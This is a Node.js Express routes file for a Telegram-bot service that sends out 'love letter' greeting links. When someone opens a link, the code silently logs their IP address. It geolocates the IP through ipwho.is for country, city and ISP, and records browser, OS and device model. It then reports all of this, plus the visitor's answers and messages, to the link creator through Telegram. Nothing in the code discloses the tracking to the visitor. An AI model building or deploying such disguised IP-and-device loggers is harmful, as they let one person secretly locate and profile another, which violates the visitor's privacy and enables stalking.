const path = require('path');
const https = require('https');
const { Markup } = require('telegraf');
const UAParser = require('ua-parser-js');
const { CATEGORY_CONFIGS } = require('./category');

function setupRoutes(app, db, saveDB, bot) {
    app.post('/api/get-content', async (req, res) => {
        try {
            const linkId = req.body.id;
            const data = db.linkDatabase[linkId];
            if (!data) return res.json({ success: false });
            
            bot.telegram.sendMessage(data.userId, `👀 লিংক ওপেন করা হয়েছে!`).catch(() => {});
            
            let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
            let ip = rawIp.split(',')[0].trim();
            if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
            
            const userAgent = req.headers['user-agent'] || "";
            const uaResult = UAParser(userAgent);
            const currentTimeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
            
            let clientDevice = req.body.deviceInfo || {};
            
            let visitorObj = {
                time: currentTimeString, 
                ip: ip, 
                country: "Unknown", 
                city: "Unknown", 
                isp: "Unknown", 
                browserName: uaResult.browser.name || "Unknown",
                browserVersion: uaResult.browser.version || "Unknown",
                osName: uaResult.os.name || "Unknown",
                osVersion: uaResult.os.version || "Unknown",
                deviceVendor: clientDevice.vendor || uaResult.device.vendor || "Unknown",
                deviceModel: clientDevice.model || uaResult.device.model || "Unknown",
                deviceType: clientDevice.type || uaResult.device.type || "Desktop/Unknown",
                cpuArchitecture: uaResult.cpu.architecture || "Unknown",
                engineName: uaResult.engine.name || "Unknown",
                engineVersion: uaResult.engine.version || "Unknown"
            };
            
            if (ip && ip !== "127.0.0.1" && ip !== "::1") {
                https.get(`https://ipwho.is/${ip}`, (apiRes) => {
                    let body = "";
                    apiRes.on('data', chunk => body += chunk);
                    apiRes.on('end', () => {
                        try {
                            const ipData = JSON.parse(body);
                            if (ipData.success) {
                                visitorObj.country = ipData.country || "Unknown";
                                visitorObj.city = ipData.city || "Unknown";
                                visitorObj.isp = ipData.connection?.isp || ipData.connection?.org || "Unknown";
                            }
                        } catch (e) {}
                        if (!data.visitors) data.visitors = [];
                        data.visitors.push(visitorObj);
                        saveDB();
                    });
                }).on('error', (err) => {
                    if (!data.visitors) data.visitors = [];
                    data.visitors.push(visitorObj);
                    saveDB();
                });
            } else {
                if (!data.visitors) data.visitors = [];
                data.visitors.push(visitorObj);
                await saveDB();
            }
            
            if (data.countdown && new Date(data.countdown) > new Date()) {
                return res.json({ success: true, isLocked: true, countdownTime: data.countdown });
            }
            
            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
            return res.json({ 
                success: true, isLocked: false, title: config.title, music: data.music, 
                animations: data.animations, letter: data.letter, emojis: config.emojis, 
                question: config.question, buttons: config.buttons, image: data.image || null 
            });
        } catch (err) { 
            res.json({ success: false }); 
        }
    });

    app.post('/api/open-envelope', async (req, res) => {
        try {
            const { id } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });

            bot.telegram.sendMessage(data.userId, `👁️‍🗨️ খাম খোলা হয়েছে!`).catch(() => {});
            return res.json({ success: true });
        } catch (err) {
            res.json({ success: false });
        }
    });

    app.post('/api/submit-answer', async (req, res) => {
        try {
            const { id, answer } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });
            
            data.hostAnswer = answer;
            await saveDB();
            
            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
            bot.telegram.sendMessage(data.userId, `📨 নোটিফিকেশন!\nQuestion: ${config.question}\nAns: ${answer}`).catch(() => {});
            
            return res.json({ success: true });
        } catch (err) { 
            res.json({ success: false }); 
        }
    });

    app.post('/api/submit-message', async (req, res) => {
        try {
            const { id, message } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });

            data.message = message;
            await saveDB();

            bot.telegram.sendMessage(data.userId, `📨 মেসেজ: ${message}`).catch(() => {});

            return res.json({ success: true });
        } catch (err) {
            res.json({ success: false });
        }
    });

    app.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
}

module.exports = { setupRoutes };
